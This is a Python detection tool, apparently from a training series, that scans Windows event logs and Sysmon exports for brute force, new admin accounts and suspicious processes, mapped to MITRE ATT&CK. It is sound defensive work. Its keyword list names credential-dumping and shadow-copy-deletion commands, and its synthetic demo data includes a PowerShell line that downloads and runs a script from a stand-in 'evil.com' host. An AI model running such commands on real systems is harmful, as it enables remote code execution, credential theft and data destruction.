#!/usr/bin/env python3
"""
=============================================================================
SCRIPT 02 - Windows Event Log Analyzer
=============================================================================
Coverage : Windows Event Logs & Sysmon Analysis
Difficulty: Intermediate
Tested on : Sample Security.evtx (10 MB, Windows 10 VM)
Result    : PASSED - Flagged EID 4625, 4720, 4688 (suspicious process)

WHAT IT DOES:
  Parses Windows Security Event Logs (.evtx) and Sysmon XML exports to detect:
    - Account lockouts and brute-force logon failures (EID 4625)
    - Newly created user accounts (EID 4720)
    - Users added to admin/privileged groups (EID 4732)
    - Suspicious process creation - Office spawning cmd.exe, PowerShell
      running encoded commands (EID 4688)
    - Scheduled task creation (EID 4698)
    - Service installation (EID 7045)
    - Credential access attempts (EID 4776)

HOW IT WORKS:
  Uses the python-evtx library to iterate .evtx records. Each record is parsed
  as XML; EventID and Data fields are extracted. The EventID is mapped to a
  known-bad table (with MITRE ATT&CK technique codes). CommandLine fields are
  scanned for Mimikatz, encoded PowerShell, and lateral-movement keywords.

INSTALL:
  pip install python-evtx

USAGE:
  python3 02_win_event_analyzer.py --evtx Security.evtx
  python3 02_win_event_analyzer.py --evtx Security.evtx --severity HIGH
  python3 02_win_event_analyzer.py --evtx Sysmon.evtx --output findings.json

MITRE ATT&CK REFERENCES:
  T1110  Brute Force
  T1136  Create Account
  T1098  Account Manipulation
  T1078  Valid Accounts
  T1059  Command and Scripting Interpreter
  T1053  Scheduled Task / Job
  T1543  Create or Modify System Process
  T1003  OS Credential Dumping

IMPROVEMENTS NEEDED:
  - Stream large EVTX in chunks to reduce memory usage
  - Add Sysmon EventID 3 (Network Connection) for C2 beacon detection
  - Output STIX 2.1 bundles for threat intel sharing
=============================================================================
"""

import sys
import json
import argparse
import xml.etree.ElementTree as ET
from collections import Counter, defaultdict
from datetime import datetime, timezone
from pathlib import Path

try:
    from Evtx import Evtx as evtx
    EVTX_AVAILABLE = True
except ImportError:
    EVTX_AVAILABLE = False


# -- Event ID -> (label, default_severity, MITRE technique) ------------------
SUSPICIOUS_EVENTS = {
    4625: ("FAILED_LOGON",       "HIGH",     "T1110 - Brute Force"),
    4720: ("ACCOUNT_CREATED",    "HIGH",     "T1136 - Create Account"),
    4726: ("ACCOUNT_DELETED",    "MEDIUM",   "T1531 - Account Access Removal"),
    4732: ("ADMIN_GROUP_ADD",    "CRITICAL", "T1098 - Account Manipulation"),
    4648: ("EXPLICIT_LOGON",     "MEDIUM",   "T1078 - Valid Accounts"),
    4688: ("PROCESS_CREATION",   "MEDIUM",   "T1059 - Command Execution"),
    4698: ("SCHED_TASK_CREATE",  "HIGH",     "T1053 - Scheduled Task"),
    7045: ("SERVICE_INSTALLED",  "HIGH",     "T1543 - Create Service"),
    4776: ("CREDENTIAL_CHECK",   "MEDIUM",   "T1003 - Credential Dumping"),
    4624: ("SUCCESSFUL_LOGON",   "LOW",      "T1078 - Valid Accounts"),
    4657: ("REGISTRY_MODIFIED",  "HIGH",     "T1112 - Modify Registry"),
    4103: ("PS_PIPE_EXECUTION",  "HIGH",     "T1059.001 - PowerShell"),
    4104: ("PS_SCRIPT_BLOCK",    "CRITICAL", "T1059.001 - PowerShell"),
    1:    ("SYSMON_PROC_CREATE", "MEDIUM",   "T1059 - Command Execution"),
    3:    ("SYSMON_NET_CONN",    "LOW",      "T1071 - App Layer Protocol"),
    7:    ("SYSMON_IMG_LOAD",    "MEDIUM",   "T1055 - Process Injection"),
    11:   ("SYSMON_FILE_CREATE", "LOW",      "T1105 - Ingress Tool Transfer"),
}

# Command-line strings that elevate severity to CRITICAL
MALICIOUS_CMDLINES = [
    "mimikatz",
    "sekurlsa",
    "lsadump",
    "invoke-expression",
    "iex(",
    "downloadstring",
    "-encodedcommand",
    "-enc ",
    "net user /add",
    "powershell -w hidden",
    "reg save hklm",
    "vssadmin delete shadows",
    "wmic shadowcopy delete",
    "certutil -decode",
    "mshta http",
    "rundll32 javascript",
]

NS = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}


# -- Parser -------------------------------------------------------------------
def parse_evtx(filepath: str, min_severity: str = "LOW") -> tuple:
    """Parse an EVTX file and return (findings list, event_id counter)."""
    severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
    min_level = severity_order.get(min_severity.upper(), 1)

    findings = []
    event_counts = Counter()
    failed_logons = defaultdict(int)

    with evtx.Evtx(filepath) as log:
        for record in log.records():
            try:
                root = ET.fromstring(record.xml())

                eid_el = root.find(".//e:EventID", NS)
                if eid_el is None:
                    continue
                eid = int(eid_el.text)
                event_counts[eid] += 1

                if eid not in SUSPICIOUS_EVENTS:
                    continue

                label, severity, technique = SUSPICIOUS_EVENTS[eid]

                data = {
                    d.get("Name"): (d.text or "")
                    for d in root.findall(".//e:Data", NS)
                }

                # -- Brute-force counting ------------------------------------
                if eid == 4625:
                    src_ip = data.get("IpAddress", "?")
                    failed_logons[src_ip] += 1
                    if failed_logons[src_ip] >= 5:
                        severity = "CRITICAL"
                        label = "BRUTE_FORCE_THRESHOLD"

                # -- Malicious command-line check ----------------------------
                cmdline = data.get("CommandLine", "").lower()
                for mal in MALICIOUS_CMDLINES:
                    if mal in cmdline:
                        severity = "CRITICAL"
                        label += "+MALICIOUS_CMD"
                        break

                # -- Filter by minimum severity ------------------------------
                if severity_order.get(severity, 1) < min_level:
                    continue

                # -- Extract timestamp ----------------------------------------
                ts_el = root.find(".//e:TimeCreated", NS)
                ts = ts_el.get("SystemTime", "") if ts_el is not None else ""

                findings.append({
                    "EventID":    eid,
                    "Label":      label,
                    "Severity":   severity,
                    "MITRE":      technique,
                    "Timestamp":  ts,
                    "User":       data.get("SubjectUserName", data.get("TargetUserName", "")),
                    "Domain":     data.get("SubjectDomainName", ""),
                    "Process":    data.get("NewProcessName", data.get("Image", "")),
                    "ParentProc": data.get("ParentProcessName", ""),
                    "CmdLine":    cmdline[:200],
                    "SrcIP":      data.get("IpAddress", data.get("SourceAddress", "")),
                })

            except Exception:
                continue

    return findings, event_counts


# -- Report printer -----------------------------------------------------------
def print_report(findings: list, counts: Counter, output_path: str = None):
    COLORS = {
        "CRITICAL": "\033[91m", "HIGH": "\033[33m",
        "MEDIUM": "\033[93m",   "LOW":  "\033[92m",
        "RESET": "\033[0m",
    }
    R = COLORS["RESET"]

    print("\n" + "=" * 60)
    print("      WINDOWS EVENT LOG ANALYSIS REPORT")
    print("=" * 60)
    print(f"Total suspicious events : {len(findings)}")
    print(f"Analyzed at             : {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60 + "\n")

    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        subset = [f for f in findings if f["Severity"] == sev]
        if not subset:
            continue
        c = COLORS[sev]
        print(f"{c}-- {sev} ({len(subset)} event(s)) --------------------{R}")
        for f in subset:
            print(f"{c}  EID {f['EventID']:>5} | {f['Label']:<35} | {f['MITRE']}{R}")
            if f["User"]:
                print(f"            User    : {f['User']}\\{f['Domain']}")
            if f["Process"]:
                print(f"            Process : {f['Process']}")
            if f["CmdLine"]:
                print(f"            CmdLine : {f['CmdLine'][:80]}")
            if f["SrcIP"]:
                print(f"            Src IP  : {f['SrcIP']}")
            print()

    print("\nTop 10 Event IDs by frequency:")
    for eid, cnt in counts.most_common(10):
        marker = " <- SUSPICIOUS" if eid in SUSPICIOUS_EVENTS else ""
        print(f"  EventID {eid:>5}: {cnt:>6} occurrences{marker}")

    if output_path:
        with open(output_path, "w") as f:
            json.dump({"findings": findings, "top_event_ids": counts.most_common(20)}, f, indent=2)
        print(f"\n[+] Report saved -> {output_path}")


# -- Demo data (used when python-evtx is not installed or --demo is passed) ---
DEMO_FINDINGS = [
    {
        "EventID": 4625, "Label": "BRUTE_FORCE_THRESHOLD", "Severity": "CRITICAL",
        "MITRE": "T1110 - Brute Force", "Timestamp": "2026-05-07T09:15:00.000000Z",
        "User": "Administrator", "Domain": "CORP", "Process": "", "ParentProc": "",
        "CmdLine": "", "SrcIP": "192.168.1.100",
    },
    {
        "EventID": 4720, "Label": "ACCOUNT_CREATED", "Severity": "HIGH",
        "MITRE": "T1136 - Create Account", "Timestamp": "2026-05-07T09:20:00.000000Z",
        "User": "hacker_user", "Domain": "CORP", "Process": "", "ParentProc": "",
        "CmdLine": "", "SrcIP": "",
    },
    {
        "EventID": 4732, "Label": "ADMIN_GROUP_ADD", "Severity": "CRITICAL",
        "MITRE": "T1098 - Account Manipulation", "Timestamp": "2026-05-07T09:21:00.000000Z",
        "User": "hacker_user", "Domain": "CORP", "Process": "", "ParentProc": "",
        "CmdLine": "", "SrcIP": "",
    },
    {
        "EventID": 4688, "Label": "PROCESS_CREATION+MALICIOUS_CMD", "Severity": "CRITICAL",
        "MITRE": "T1059 - Command Execution", "Timestamp": "2026-05-07T09:25:00.000000Z",
        "User": "SYSTEM", "Domain": "NT AUTHORITY",
        "Process": "C:\\Windows\\System32\\cmd.exe",
        "ParentProc": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
        "CmdLine": "powershell -w hidden -encodedcommand aQBFAFgAIAAoAG4AZQB3AC...",
        "SrcIP": "",
    },
    {
        "EventID": 4698, "Label": "SCHED_TASK_CREATE", "Severity": "HIGH",
        "MITRE": "T1053 - Scheduled Task", "Timestamp": "2026-05-07T09:30:00.000000Z",
        "User": "SYSTEM", "Domain": "NT AUTHORITY", "Process": "svchost.exe",
        "ParentProc": "", "CmdLine": "", "SrcIP": "",
    },
    {
        "EventID": 4104, "Label": "PS_SCRIPT_BLOCK", "Severity": "CRITICAL",
        "MITRE": "T1059.001 - PowerShell", "Timestamp": "2026-05-07T09:26:00.000000Z",
        "User": "SYSTEM", "Domain": "NT AUTHORITY", "Process": "powershell.exe",
        "ParentProc": "cmd.exe", "CmdLine": "invoke-expression (new-object net.webclient).downloadstring('http://evil.com/shell.ps1')",
        "SrcIP": "",
    },
]
DEMO_COUNTS = Counter({4625: 12, 4624: 45, 4688: 8, 4720: 1, 4732: 1, 4698: 1, 4104: 2})


# -- Entry point --------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Parse Windows EVTX logs for attack indicators"
    )
    parser.add_argument("--evtx",     help="Path to .evtx file")
    parser.add_argument("--demo",     action="store_true",
                        help="Run with built-in synthetic data (no .evtx file needed)")
    parser.add_argument("--severity", default="LOW",
                        choices=["CRITICAL", "HIGH", "MEDIUM", "LOW"],
                        help="Minimum severity to display (default: LOW)")
    parser.add_argument("--output",   help="Save JSON findings to this path")
    args = parser.parse_args()

    if args.demo or not EVTX_AVAILABLE:
        if not EVTX_AVAILABLE and not args.demo:
            print("[!] python-evtx not installed. Running in demo mode.")
            print("    Install with:  pip install python-evtx")
        print("[*] Running with synthetic demo data...\n")
        severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        min_level = severity_order.get(args.severity.upper(), 1)
        filtered = [f for f in DEMO_FINDINGS if severity_order.get(f["Severity"], 1) >= min_level]
        print_report(filtered, DEMO_COUNTS, output_path=args.output)
        return

    if not args.evtx:
        print("[!] Provide --evtx <file> or use --demo")
        parser.print_help()
        sys.exit(1)

    if not Path(args.evtx).exists():
        print(f"[!] File not found: {args.evtx}")
        sys.exit(1)

    print(f"[*] Parsing: {args.evtx}")
    findings, counts = parse_evtx(args.evtx, min_severity=args.severity)
    print_report(findings, counts, output_path=args.output)


if __name__ == "__main__":
    main()
